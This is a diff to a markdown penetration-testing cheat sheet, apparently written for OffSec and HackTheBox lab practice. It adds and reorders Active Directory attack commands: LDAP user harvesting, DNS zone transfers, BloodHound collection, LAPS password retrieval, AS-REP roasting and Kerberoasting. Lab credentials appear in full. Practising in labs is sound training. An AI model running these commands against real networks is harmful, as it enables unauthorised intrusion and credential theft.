@@ -34,6 +34,8 @@
   - [Responder](#responder)
   - [Hydra](#hydra)
   - [socat](#socat)
+  - [dig](#dig)
+  - [dnsenum](#dnsenum)
 - [SSH](#ssh)
   - [SSH KEY](#ssh-key)
   - [SSH Tunneling](#ssh-tunneling)
@@ -495,6 +497,11 @@ rdesktop 192.168.216.165
 
 
 ### Impacket
+Get AD Users
+```bash
+impacket-GetADUsers -all -dc-ip 192.168.243.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
+```
+
 **AS-REP Roasting**
 ```bash
 # When we know that fsmith's hash is available(no password required)
@@ -518,7 +525,11 @@ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
 ```bash
 # unauthenticated
 ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec' -s base namingcontexts
-ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec'
+ldapsearch -x -H ldap://192.168.216.122 -D 'hutch.offsec'  -b 'DC=hutch,DC=offsec' > ldap_search.txt
+--> If we get the results
+  # cat ldap_search.txt | grep -i "samaccountname" > raw_users.txt
+  # cat raw_users.txt | cut -d: -f2 | tr -d " " > users.txt
+  # user users.txt with kerbrute 
 
 # authenticated(LAPS found from SYSVOL)
 ldapsearch -x -H 'ldap://192.168.216.122' -D 'hutch\fmcsorley' -w 'CrabSharkJellyfish192' -b 'dc=hutch,dc=offsec' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd
@@ -728,6 +739,26 @@ sudo hydra -l george -P /usr/share/wordlists/rockyou.txt -s 2222 ssh://<% tp.fro
 sudo socat tcp-listen:135,reuseaddr,fork tcp:<victim.ip.add.ress>:9999
 ```
 
+### dig
+```bash
+dig @10.10.10.161 AXFR htb.local
+```
+
+### dnsenum
+```bash
+dnsenum 192.168.162.122
+```
+
+### bloodhound-python
+```bash
+bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all
+```
+
+### pyLAPS.py -> get local administrator's password!
+```bash
+pyLAPS.py --action get -d "DOMAIN" -u "ControlledUser" -p "ItsPassword"
+```
+
 ### snmpwalk(161)
 ```bash
 snmpwalk -c public -v1 192.168.x.x
@@ -883,6 +914,9 @@ echo "AddType application/x-httpd-php .xxx" > htaccess
 # nmap
 nmap 10.10.10.175 --script=smb-enum* -p445
 
+# bloodhound : after discovering valid user credentials and we can't winrm...! so useful
+bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.216.122 -d hutch.offsec -c all
+
 #crackmapexec(smb/winrm)
 crackmapexec smb 10.10.10.175 -u "" -p "" -d Egotistical-bank.local
 crackmapexec smb 10.10.10.175 -u "fsmith" -p "" -d Egotistical-bank.local
@@ -904,7 +938,7 @@ smbclient "\\\\10.10.10.175\\RICOH Aficio SP 8300DN PCL 6" -U "Egotistical-bank.
 
 # dns
 dig @10.10.10.161 AXFR htb.local
-
+dnsenum 192.168.162.122
 
 # smbmap
 smbmap -H 10.10.10.161
@@ -936,23 +970,27 @@ ldapsearch -x -H ldap://10.10.10.175 -b "dc=Egotistical-bank,dc=local"
 ./kerbrute userenum -d heist.offsec --dc 192.168.243.165 /PATH/TO/FILE/<USERNAMES>
 
 
+# GetADUsers
+impacket-GetADUsers -all -dc-ip 192.168.243.122 hutch.offsec/fmcsorley:CrabSharkJellyfish192
+
+
+
 # GetNPUsers.py(18200)
-## anon
-### without providing anything.
+- without providing anything.
 impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/
 GetNPUsers.py Egotistical-bank.local/ -dc-ip 10.10.10.175
 GetNPUsers.py active.htb/ -dc-ip 10.10.10.100
 
 
-### with usernames.txt
+- with potential usernames.txt
 impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
 
-### with username whos "Do not require Kerberos preauthentication" is enabled (## This will get us dave's TGT if his pre-authentication)
+- with username whos "Do not require Kerberos preauthentication" is enabled (## This will get us dave's TGT if his pre-authentication)
 impacket-GetNPUsers -dc-ip 192.168.250.70 -request corp.com/dave -no-pass
 impacket-GetNPUsers Egotistical-bank.local/fsmith -dc-ip 10.10.10.175 -request -no-pass
 impacket-GetNPUsers <% tp.frontmatter["RHOST"] %>/<% tp.frontmatter["USERNAME"] %> -request -no-pass -dc-ip <% tp.frontmatter["RHOST"] %>
 
-### with valid credentials(pete/Nexus123!) this will return a user's TGT ticket whos "Do not require Kerberos preauthentication" is enabled.
+- with valid credentials(pete/Nexus123!) this will return a user's TGT ticket whos "Do not require Kerberos preauthentication" is enabled.
 impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast corp.com/pete (#this requires pete's password for us to be able to get dave's TGT)
 
 ### with username list
@@ -962,12 +1000,7 @@ GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -ou
 # Kerberoast(requires valid credentials) 13100
 sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
 
-## hashcat
-hashcat -m 18200 ./hash.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
-hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
 
-# bloodhound
-bloodhound-python --dns-tcp -ns 10.129.193.5 -d active.htb -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
 ```
 
 
